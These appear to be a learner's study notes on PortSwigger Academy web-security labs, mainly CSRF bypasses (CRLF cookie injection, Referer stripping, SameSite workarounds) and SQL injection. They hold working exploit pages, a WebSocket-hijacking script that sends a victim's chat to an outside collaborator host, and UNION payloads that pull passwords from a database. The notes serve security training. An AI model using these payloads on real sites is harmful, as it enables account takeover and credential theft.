# Portswigger Academy =Labs

- CSRF
    - Testing methodology
        - In order for a CSRF attack to be possible:
            - A relevant action: change a users email
            - Cookie-based session handling: session cookie
            - No unpredictable request parameters
        
        Testing CSRF Tokens:
        
        1. Remove the CSRF token and see if application accepts request
        2. Change the request method from POST to GET
        3. See if csrf token is tied to user session
        - when you have a CSRF cookie
            1. Check if the CSRF token is tied to the CSRF cookie
                - Submit an invalid CSRF token
                - Submit a valid CSRF token from another user
            2. Submit valid CSRF token and cookie from another user
            - when token is duplicated in a cookie
                
                In order to exploit this vulnerability, we need to perform 2 things:
                
                1. Inject a csrf cookie in the user's session (HTTP Header injection) - satisfied
                2. Send a CSRF attack to the victim with a known csrf token
        - when backend uses the Referer and not a token
            1. Remove the Referer header
            2. Check which portion of the referrer header is the application validating
    - CSRF vulnerability with no defenses
        
        used following code from portswigger csrf page : 
        
        ```jsx
        Hello, world!
        <html>
          <body>
            <form action="https://ac491f361fad4b2bc0472c6b008f00fa.web-security-academy.net/my-account/change-email" method="POST">
              <input type="hidden" name="email" value="pwned@evil-user.net" />
            </form>
            <script>
              document.forms[0].submit();
            </script>
          </body>
        </html>
        ```
        
        CSRF poc generator > options > include auto-submit script
        
        In order to check what the user can see,  meaning if the user’s email changed, click on “view exploit”
        
    - Validation of CSRF token depends on request method
        
        CSRF protection dosent apply in GET request method, so we switch to GET and remove the token : 
        
        ```jsx
        Hello, world!
        <img src="[https://ac561fb01ed84c2ec034097100a4008d.web-security-academy.net/my-account/change-email?email=elliot@ecorp.com](https://ac561fb01ed84c2ec034097100a4008d.web-security-academy.net/my-account/change-email?email=elliot@ecorp.com)" width="0" height="0" border="0" >
        ```
        
        rana khalil’s code : 
        
        ```jsx
        <html>
            <body>
                <h1>Hello World!</h1>
                <iframe style="display:none" name="csrf-iframe"></iframe>
                <form action="https://target-acee1f521e65f40d80e4b992006a0005.web-security-academy.net/my-account/change-email/" method="get" target="csrf-iframe" id="csrf-form">
                    <input type="hidden" name="email" value="test5@test.ca">
                </form>
        
                <script>document.getElementById("csrf-form").submit()</script>
            </body>
        </html>
        ```
        
    - CSRF where token validation depends on token being present
        - lab link
            
            [https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)
            
        - Notice that the verification is skipped when we simply remove the CSRF token
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled.png)
            
        - then we use the same exploit we used for the first lab (where there is no CSRF defense )
            
            ```jsx
            Hello, world!
            <html>
              <body>
                <form action="https://ac491f361fad4b2bc0472c6b008f00fa.web-security-academy.net/my-account/change-email" method="POST">
                  <input type="hidden" name="email" value="pwned@evil-user.net" />
                </form>
                <script>
                  document.forms[0].submit();
                </script>
              </body>
            </html>
            ```
            
    - CSRF token is not tied to the user session
        
        basically a token associated to one user can work for another user
        
        Altough, in this challenge u have to **inspect element**  cuz if u use a token once , it gets expired
        
        (maybe u can also  intercept the request /change-email, copy the token, drop the request, and use the token in the exploit)
        
    - CSRF token is tied to a non-session cookie
        - basically the vulnerability is that the csrf token is not tied to the session cookie and tied to another cookie called csrfkey here.
        - So, if we can submit valid CSRF token and cookie from another user, it’s game over
        - In order to exploit this vulnerability, we need to perform 2 things:
        - Inject a csrfKey cookie in the user's session (HTTP Header injection), this is done with a CRLF Injection in this case.
            
            The %0d is URL encding for a carriage return, while %0a is an encoded line feed, which together will be intreprested as a new line
            
            `%0d%0a` for a new line
            
            - optional note about CRLF injection
                
                The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other
                application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if
                the cookie that is controlled has suitable scope. For example, a cookie-setting function on `staging.demo.normal-website.com` could be leveraged to place a cookie that is submitted to `secure.normal-website.com`.
                
        - Send a CSRF attack to the victim with a known CSRF token
            - code 1
                
                the code (the onerror attribute of img here make sure that the cookie is changed before the request is sent )  
                
                ```jsx
                <html>
                <!-- CSRF PoC - generated by Burp Suite Professional -->
                <body>
                <script>history.pushState('', '', '/')</script>
                <form action="[https://acc01f151f703df8c0436872008f00fc.web-security-academy.net/my-account/change-email](https://acc01f151f703df8c0436872008f00fc.web-security-academy.net/my-account/change-email)" method="POST">
                <input type="hidden" name="email" [value="a@a.com](mailto:value=%22a@a.com)" />
                <input type="hidden" name="csrf" value="OKb6mZjQSXctJQmHtxEsMhchjn7AhNeN" />
                <input type="submit" value="Submit request" />
                </form>
                <img src="[https://acc01f151f703df8c0436872008f00fc.web-security-academy.net/?search=yo (crlf characters in url encoding)
                Set-Cookie: csrfKey=lEjoaMKfWDZxwas36NJw6cT9OvaDiVSS](https://acc01f151f703df8c0436872008f00fc.web-security-academy.net/?search=yo%0d%0aSet-Cookie:%20csrfKey=lEjoaMKfWDZxwas36NJw6cT9OvaDiVSS)" onerror="document.forms[0].submit()" />
                </body>
                </html>
                ```
                
            - one year after doing the lab, code 1 didn’t work
                - the problem was setting the cookie using the CRLF injection didn’t work, the browser still used the old cookie
                - Since 2021, Chrome applies `Lax` SameSite restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level.
                - Like shown in this note from rana khalil, the browsers are more secure and we have to use the CRLF injection to add the part in red
                - the red part sets the attribute `Samesite` of the cookie `csrfkey`  to the value `None` which means that this cookie can be sent to the server from a third party website (like our exploit server)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%201.png)
                
            - code 2 which works
                - lab was not validated until i used this email for some reason
                
                ```jsx
                <html>
                  <body>
                  	<img src="https://0a5600790338a667807e6cc800390078.web-security-academy.net/?search=%61%3b%0d%0a%53%65%74%2d%43%6f%6f%6b%69%65%3a%20%63%73%72%66%4b%65%79%3d%7a%4d%58%44%6b%73%49%6a%68%54%69%6e%46%44%76%43%50%4d%64%78%43%70%6e%6a%57%77%79%6f%35%38%70%55%3b%20SameSite=None"  width="0" height="0" border="0" >
                    <form action="https://0a5600790338a667807e6cc800390078.web-security-academy.net/my-account/change-email" method="POST">
                      <input type="hidden" name="email" value="hacker@evil-user.net" />
                      <input type="hidden" name="csrf" value="hnZiR9fKuVBuxoJMikageyFYQZ2vrhq7" />
                    </form>
                    <script>
                      document.forms[0].submit();
                    </script>
                  </body>
                </html>
                ```
                
            - rana’s code
                
                ```jsx
                <html>
                    <body>
                        <h1>Hello World!</h1>
                        <form action="https:///0a33009903154da184367954005e0013.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
                            <input type="hidden" name="email" value="test5@test.ca">
                            <input type="hidden" name="csrf" value="UYjqwyyGyrsnr8qGu5adRFltwGbIS8S6">
                        </form>
                
                        <img src="https://0a33009903154da184367954005e0013.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=04WkQgPVzQFtURvOaoJEwc04UjhQb5Gb%3b%20SameSite=None" onerror="document.forms[0].submit()">
                    </body>
                </html>
                ```
                
    - CSRF where token is duplicated in cookie
        
        In this situation, the attacker doesn't need to obtain a valid token of their own. They simply invent a token, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.
        
        - Code 1
            
            ```jsx
            <html>
            <!-- CSRF PoC - generated by Burp Suite Professional -->
            <body>
            <script>history.pushState('', '', '/')</script>
            <form action="[https://acd51fa11fa15cd4c090200c009700a6.web-security-academy.net/my-account/change-email](https://acd51fa11fa15cd4c090200c009700a6.web-security-academy.net/my-account/change-email)" method="POST">
            <input type="hidden" name="email" [value="a@a.com](mailto:value=%22a@a.com)" />
            <input type="hidden" name="csrf" value="PbA3DuMzOsYWRkfb96PPcgpsmCZ221Iz" />
            <input type="submit" value="Submit request" />
            </form>
            <img src="[https://acd51fa11fa15cd4c090200c009700a6.web-security-academy.net/?search=yo
            Set-Cookie: csrf=PbA3DuMzOsYWRkfb96PPcgpsmCZ221Iz](https://acd51fa11fa15cd4c090200c009700a6.web-security-academy.net/?search=yo%0d%0aSet-Cookie:%20csrf=PbA3DuMzOsYWRkfb96PPcgpsmCZ221Iz)" onerror="document.forms[0].submit()"  />
            </body>
            </html>
            ```
            
        - Code 2 which works
            - like the previous lab, this won’t work work because browsers are more secure now, so we have to add the attribute `SameSite:None`
            - Since 2021, Chrome applies `Lax` SameSite restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level.
            
            ```jsx
            <html>
            <body>
            <img src="[https://0aee009a030920b780c0999c0022003d.web-security-academy.net/?search=a%3B
            Set-Cookie%3A csrf%3DzMXDksIjhTinFDvCPMdxCpnjWwyo58pU%3B SameSite%3DNone](https://0aee009a030920b780c0999c0022003d.web-security-academy.net/?search=%61%3b%0d%0a%53%65%74%2d%43%6f%6f%6b%69%65%3a%20%63%73%72%66%3d%7a%4d%58%44%6b%73%49%6a%68%54%69%6e%46%44%76%43%50%4d%64%78%43%70%6e%6a%57%77%79%6f%35%38%70%55%3b%20%53%61%6d%65%53%69%74%65%3d%4e%6f%6e%65)"  width="0" height="0" border="0" >
            <form action="[https://0aee009a030920b780c0999c0022003d.web-security-academy.net/my-account/change-email](https://0aee009a030920b780c0999c0022003d.web-security-academy.net/my-account/change-email)" method="POST">
            <input type="hidden" name="email" [value="pwned@evil-user.net](mailto:value=%22pwned@evil-user.net)" />
            <input type="hidden" name="csrf" value="zMXDksIjhTinFDvCPMdxCpnjWwyo58pU" />
            </form>
            <script>
            document.forms[0].submit();
            </script>
            </body>
            </html>
            ```
            
        - Rana’s code
            
            ```jsx
            <html>
                <body>
                    <h1>Hello World!</h1>
                    <form action="https://0a25003904014c148065ad2c00ae00af.web-security-academy.net/my-account/change-email" method="post">
                        <input type="hidden" name="email" value="test5@test.ca">
                        <input type="hidden" name="csrf" value="hacked">
                    </form>
            
                    <img src="https://0a25003904014c148065ad2c00ae00af.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" onerror="document.forms[0].submit()">
                </body>
            </html>
            ```
            
    - Referer-based defenses against CSRF
        - Validation of Referer depends on header being present
            - an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the `Referer` header in the resulting request. There are various ways to achieve 
            this, but the easiest is using a META tag within the HTML page that  hosts the CSRF attack:
            
            ```jsx
            <meta name="referrer" content="never">
            ```
            
            - this instructs the user agent(the browser in this case) to not include the referer header in all the http requests t that originate from this document
            
            [User agent - MDN Web Docs Glossary: Definitions of Web-related terms | MDN](https://developer.mozilla.org/en-US/docs/Glossary/User_agent)
            
            - Code :
                
                ```jsx
                <html>
                <!-- CSRF PoC - generated by Burp Suite Professional -->
                <body>
                <script>history.pushState('', '', '/')</script>
                <form action="[https://aca41fc11fc96d88c051210b00500085.web-security-academy.net/my-account/change-email](https://aca41fc11fc96d88c051210b00500085.web-security-academy.net/my-account/change-email)" method="POST">
                <meta name="referrer" content="never">
                <input type="hidden" name="email" [value="c@c.com](mailto:value=%22c@c.com)" />
                <input type="submit" value="Submit request" />
                </form>
                <script>
                document.forms[0].submit();
                </script>
                </body>
                </html>
                ```
                
        - Validation of Referer can be circumvented
            
            Some applications validate the `Referer` header in a naive way that can be bypassed. 
            
            For example, the application may validates that the `Referer` contains the domain name. In this case, the attacker can place the required value elsewhere in the URL. 
            
            - For example, using the `history.pushState` function
                
                ```jsx
                history.pushState('', '', '/?[d](http://ac501f6a1f904748c02e4475009b0003.web-security-academy.net/)omain_name_checked')
                ```
                
                - basically this won’t reload the page but only change the current URL in the address bar, so that when we run the code sending the POST request, the referer will contain the new value (the domain name of the vulnerable app)
                    - [https://florianherlings.de/posts/2020-04-22-history-javascript-pushstate/](https://florianherlings.de/posts/2020-04-22-history-javascript-pushstate/)
                        
                        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%202.png)
                        
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%203.png)
                
                [History.pushState() - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/History/pushState)
                
                Code : 
                
                ```jsx
                <html>
                <!-- CSRF PoC - generated by Burp Suite Professional -->
                <body>
                <script>history.pushState('', '', '/?[ac501f6a1f904748c02e4475009b0003.web-security-academy.net](http://ac501f6a1f904748c02e4475009b0003.web-security-academy.net/)')</script>
                <form action="[https://ac501f6a1f904748c02e4475009b0003.web-security-academy.net/my-account/change-email](https://ac501f6a1f904748c02e4475009b0003.web-security-academy.net/my-account/change-email)" method="POST">
                <input type="hidden" name="email" [value="d@d.com](mailto:value=%22d@d.com)" />
                <input type="submit" value="Submit request" />
                </form>
                <script>
                document.forms[0].submit();
                </script>
                </body>
                </html>
                ```
                
                the referer will be [http://burpsuite](http://burpsuite) and no parameters will be sent in many browsers so   u ll have to add the following header in the exploit server : 
                
                `Referrer-Policy: unsafe-url`
                
                - this tells the browsers that we don’t care if the new website (vulnerable app) get the full URL and not only the domain name of the exploit server
            - Another way to do this that works but didn’t solve the lab
                - code
                    
                    ```jsx
                    Hello, world!
                    <html>
                      <body>
                        <form action="https://0aa4006d04159d3482ba4ec900c10066.web-security-academy.net/my-account/change-email" method="POST">
                          <input type="hidden" name="email" value="rana@c.com" />
                        </form>
                      </body>
                      <script>
                         document.forms[0].submit();
                    	</script>
                    </html>
                    ```
                    
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%204.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%205.png)
                
    - SameSite Lax bypass via method override
        - lab link
            
            [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)
            
        - course link
            
            [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
            
        - we have `SameSite=Lax`  because it’s the chrome default
        - the request should involve a top-level navigation, so we will use `document.location`
        - the value of  `_method`  takes precedence over the normal method in Symfony
        - we confirm that it’s the case in our lab
            
            ```jsx
            https://0a6d005604eb39df81cd16b4005a00e0.web-security-academy.net/my-account/change-email?email=hacker@a.com&_method=POST
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%206.png)
            
        - the exploit code
            
            ```jsx
            <script>
                document.location = 'https://0a0400ea041ff27284dbfad000870039.web-security-academy.net/my-account/change-email?email=hacker@a.com&_method=POST';
            </script>
            ```
            
    - SameSite Strict bypass via client-side redirect
        - lab link
            
            [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)
            
        - since we have `SameSite=strict`  we can’t exploit that unless there is another bug(s)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%207.png)
            
        - By using the comment feature, we notice that the app get redirected quickly after commenting, when we look at burp we find that it’s calling the following Javascript script
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%208.png)
            
            - Code
                
                ```jsx
                edirectOnConfirmation = (blogPath) => {
                    setTimeout(() => {
                        const url = new URL(window.location);
                        const postId = url.searchParams.get("postId");
                        window.location = blogPath + '/' + postId;
                    }, 3000);
                }
                ```
                
            - chatgpt explanation
                
                The overall functionality of this code can be summarized as follows:
                
                When the **`redirectOnConfirmation`** function is called with a specific **`blogPath`**, it sets up a timer that waits for 3 seconds. After 3 seconds, the function extracts the "postId" query parameter from the current URL, and then it redirects the user to the URL formed by combining the **`blogPath`** and the extracted **`postId`**.
                
                For example, if you call **`redirectOnConfirmation('/blogs')`** on the page **`https://www.example.com/blog?postId=123`**, the user will be redirected to **`https://www.example.com/blogs/123`** after a 3-second delay.
                
        - Notice that the the function defined in the script is called in the following endpoint
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%209.png)
            
        - This means that if we have `/post/…./?postId=foo` we will redirected to `/post/foo` (after the 3 seconds delay)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2010.png)
            
        - we need a way to escape from the `/post` otherwise we don’t have a redirect
        - So, we try to use the famous `../`  to go back to the parent directory which worked
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2011.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2012.png)
            
        - Notice that the endpoint of changing the email works in GET  too
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2013.png)
            
        - Using that information, we can forge a URL that changes the email (url encoding is important here)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2014.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2015.png)
            
        - Finally, we put that URL inside `window.location` and feed it to the victim to solve the lab
            
            ```jsx
            <script>
                document.location = 'https://0a21007b031494908014589000ff00a8.web-security-academy.net/post/comment/confirmation?postId=%2e%2e%2f%6d%79%2d%61%63%63%6f%75%6e%74%2f%63%68%61%6e%67%65%2d%65%6d%61%69%6c%3f%65%6d%61%69%6c%3d%63%25%34%30%63%2e%63%6f%6d%26%73%75%62%6d%69%74%3d%31';
            </script>
            ```
            
    - SameSite Strict bypass via sibling domain
        - lab link
            
            [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
            
        - if we try to do  the exact steps in the lab Cross-site WebSocket hijacking ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)). It won’t work
        - because we have `SameSIte=Strict` so the server will block sending the session cookie in the request originated from our exploit server, it has to be the same domain or a subdomain
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2016.png)
            
        - you should remove svg from the hidden extensions (specially when u’re stuck in a lab)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2017.png)
            
        - because otherwise you’ll miss the following request which has an important domain in the value of the CORS header
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2018.png)
            
        - if we access that domain, we’ll find that it has a login form which is vulnerable to an XSS
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2019.png)
            
        - remember that [0ab200f404f686e781dde85200770015.web-security-academy.net](http://0ab200f404f686e781dde85200770015.web-security-academy.net/) and [cms-0ab200f404f686e781dde85200770015.web-security-academy.net](http://cms-0ab200f404f686e781dde85200770015.web-security-academy.net/) are considered the same site in the context of SameSite
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2020.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2021.png)
            
        - new reminder, use burp browser for apps using websockets, firefox will throw an error in the fetch part
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2022.png)
            
        - This way, we can run the exploit code of the Cross-site WebSocket hijacking (CSWSH) from “the same site” and bypass the samesite protection
            
            ```jsx
            <script>
                var ws = new WebSocket('wss://0ab200f404f686e781dde85200770015.web-security-academy.net/chat');
                ws.onopen = function() {
                    ws.send("READY");
                };
                ws.onmessage = function(event) {
                    fetch('https://6w3mzfm64jd9ejqxfgve7iap7gd811pq.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
                };
            </script>
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2023.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2024.png)
            
        - Notice that the authentication will still work if you change the request method to GET
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2025.png)
            
        - This is handy because now, we can  url-encode the exploit code and forge an URL that performs a CSRF
            
            ```jsx
            https://cms-0ab200f404f686e781dde85200770015.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%62%32%30%30%66%34%30%34%66%36%38%36%65%37%38%31%64%64%65%38%35%32%30%30%37%37%30%30%31%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%36%77%33%6d%7a%66%6d%36%34%6a%64%39%65%6a%71%78%66%67%76%65%37%69%61%70%37%67%64%38%31%31%70%71%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=aaaaaaaa
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2026.png)
            
        - Finally, we feed the URL to the victim, get Carlos’s password and solve the lab
            
            ```jsx
            <script>window.location="https://cms-0ab200f404f686e781dde85200770015.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%62%32%30%30%66%34%30%34%66%36%38%36%65%37%38%31%64%64%65%38%35%32%30%30%37%37%30%30%31%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%36%77%33%6d%7a%66%6d%36%34%6a%64%39%65%6a%71%78%66%67%76%65%37%69%61%70%37%67%64%38%31%31%70%71%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=aaaaaaaa"</script>
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2027.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2028.png)
            
        - we can also use fetch with GET and send the victim’s chat to the server’s access log (without using collaborator)
            - from rana’s video solution
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2029.png)
            
    - SameSite Lax bypass via cookie refresh
        - lab link
            
            [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)
            
        - course part is important to understand
            
            [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-with-newly-issued-cookies](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-with-newly-issued-cookies)
            
        - Notice that accessing `/social-login` triggers Oauth process (2 requests)  which renews the cookie of the user even if he’s connected
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2030.png)
            
        - This can helps us implement the attack scenario described in the course where we will open a new tab with this endpoint and send the CSRF POST requests next
        - this two requests should be send after the click of the victim because manual interaction is the only way to open popup tabs
        - here is the exploit code to perform this attack
            
            ```jsx
            <html>
              <body>
              <script>
              window.onclick = () => {
                window.open('https://0a0800f903822ddb80eeb24a00610002.web-security-academy.net/social-login');
                 document.forms[0].submit();
            	}</script>
                <form action="https://0a0800f903822ddb80eeb24a00610002.web-security-academy.net/my-account/change-email" method="POST">
                  <input type="hidden" name="email" value="pwned@evil-user.net" />
                </form>
              </body>
            </html>
            ```
            
        - running exploit locally
            - before click
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2031.png)
                
            - after click
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2032.png)
                
- SQLI
    - [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
        
        ‘ or 9=9— 
        
    - [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
        
        ‘ or 9=9—
        
        administrator’ —
        
    - SQL injection UNION attack, determining the number of columns returned by the query
        
        ' union select NULL,NULL,NULL—    
        
        keep adding NULL values until you no longer get an error (3 columns in this case)
        
        ' ORDER BY 4— (throws an error, so 3 coulumns)
        
        start with “order by 1” 
        
    - [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
        
        tried “ORDER BY 4” and it gave me an error, so there are 3 columns
        
        tried “  ' union select 'a',NULL,NULL— “  and it gave me an error
        
        ' union select 'a',NULL,NULL— was able to print a (so i changed ‘a’ with the string that they wanted to solve the challenge)
        
        rule here is : If an error occurs, move on to the next null and try that instead.
        
    - [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
        
        “ '+ORDER+BY+3—” throws an error so 2 coulumns
        
        `'+UNION+SELECT+'abc','def'--`
        
        ' union select username,password from users—
        
        `'+UNION+SELECT+username,+password+FROM+users--`
        
        login with administrator creds found (pwds are in cleartext)
        
    - SQL injection UNION attack, retrieving multiple values in a single column
        
        only “ ' union select NULL,'a'--” works, so we can extract data only in the second column
        
        `'+UNION+SELECT+NULL,'abc'--`
        
        we can output each column at a time, but in order to do concatenation, we have to find the type of database first. So we ll use the cheat sheet to try different type of databases : 
        
        @@version of Microsoft and MySQL threw an error while “version()” if PostgreSQL didn't and showed the exact version
        
        ```sql
        ' union select NULL,version()--
        ```
        
        so since the cheatsheet, concatenation in postgresql is done with `'foo'||'bar'`
        
        then the payload is : ' union select NULL,username || password from users—
        
        or :   **' union select NULL,username ||' '|| password from users—**
        
        or : **' union select NULL,concat(username,'  ',password) from users--**
        
        (concat function works even if it’s not in cheatsheet)
        
        **Dont encode with burp, just put payloads in URL Bar**
        
    - SQL injection attack, querying the database type and version on Oracle
        
        `' union select NULL,NULL—`   wont work
        
        Because In Oracle, the SELECT statement must have a FROM [clause. So](http://clause.So) we  need a dummy table to use when we want to display some data not belonging to any table.
        
         Fortunately, Oracle provides you with the **DUAL** table which is a special table that belongs to the schema of the user SYS but it's accessible to all users
        
        `'+UNION+SELECT+'abc','def'+FROM+dual--`
        
        so, using the cheat sheet,  we modify the payload to get the database version : 
        
        `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
        
    - SQL injection attack, querying the database type and version on MySQL and Microsoft
        
        we get an internal error after typing  `‘ order by 1—` because the `—` is blacklisted
        
        if we change the `—` by `#` to have : `+order+by+1%23` we wont get an error 
        
        use burp’s Repeater  ⇒ convert selection ⇒ URL ⇒  URL- encode key characters
        
        or simply use CRTL+U
        
        If we keep trying databases (or use the lab description), we ll find that this works : 
        
        `' union select @@version,'yo' #`
        
    - SQL injection attack, listing the database contents on non-Oracle databases
        
        we got a hint that it’s not an oracle database, but we can always try to output the version.
        
        Since there is no column names in portswigger, we can try table_name and column_name if that dosen’t work, google ‘information_schema postgreesql” for ex, and check what are the column names in that table
        
        Rana Analysis:
        
        1. Find the number of columns
        ' order by 3-- -> Internal server error
        3 - 1 = 2
        2. Find the data type of the columns
